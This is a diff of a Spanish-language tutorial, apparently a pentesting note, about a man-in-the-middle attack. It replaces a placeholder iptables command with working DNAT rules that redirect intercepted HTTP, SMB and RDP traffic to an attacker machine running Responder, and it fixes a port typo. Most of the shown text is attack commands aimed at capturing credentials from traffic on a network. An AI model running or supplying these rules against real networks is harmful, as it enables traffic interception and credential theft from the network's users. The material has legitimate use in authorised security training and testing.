@@ -38,13 +38,19 @@ Una vez el MiTM fue conseguido lo siguiente es decidir que vamos a hacer con tod
 Ya con el objetivo decidido el tercer paso es montar los servidores o servicios como se menciona en el paso 2 y por ultimo deberemos configurar nuestras reglas enrutamiento con iptables para conseguir redirigir todo el trafico a nuestros servicios maliciosos.
 
 ### Link Start
-- Lo primero que vamos a realizar es la configuracion del ruteo atravez de ip tables, lo que vamos a hacer basicamente es redirigir todo el trafico que vaya para cualquier ip y que este pasando a travez de nuestra maquina y con destino los puertos 80, 139, 445, 3379... hacia nuestra ip en nuestros respectivos puertos 80, 139, 445, 3379...
+- Lo primero que vamos a realizar es la configuracion del ruteo atravez de ip tables, lo que vamos a hacer basicamente es redirigir todo el trafico que vaya para cualquier ip y que este pasando a travez de nuestra maquina y con destino los puertos 80, 139, 445, 3389... hacia nuestra ip en nuestros respectivos puertos 80, 139, 445, 3389...
 ```
 # Listar nuestras reglas de iptables en la tabla nat que es la que nos interesa para ver que no halla nada raro o en conflicto
 sudo iptables -L -t nat
 
-# Agregar las reglas de prerouting para redirigir todo paquete con destino al puerto 80, 139, 445, 3379 a nuestros puertos que despues seran abiertos con Responder
-sudo iptables -t nat -A PREROUTING -j DNAT
+# Agregar las reglas de prerouting para redirigir todo paquete con destino al puerto 80, 139, 445, 3389 a nuestros puertos que despues seran abiertos con Responder
+# Sea nuestra ip con responder 192.168.1.22
+sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.22:80
+sudo iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 192.168.1.22:80
+sudo iptables -t nat -A PREROUTING -p tcp --dport 139 -j DNAT --to-destination 192.168.1.22:139
+sudo iptables -t nat -A PREROUTING -p tcp --dport 445 -j DNAT --to-destination 192.168.1.22:445
+sudo iptables -t nat -A PREROUTING -p tcp --dport 3389 -j DNAT --to-destination 192.168.1.22:3389
+
 
 # Ahora hay que activar el enmascaramiento para que el paquete pase a ser cosiderado propio y pueda ser modificado (O algo asi, mi especialidad no es iptables jejeje)
 sudo iptables -t nat -A POSTROUTING -j MASQUERADE
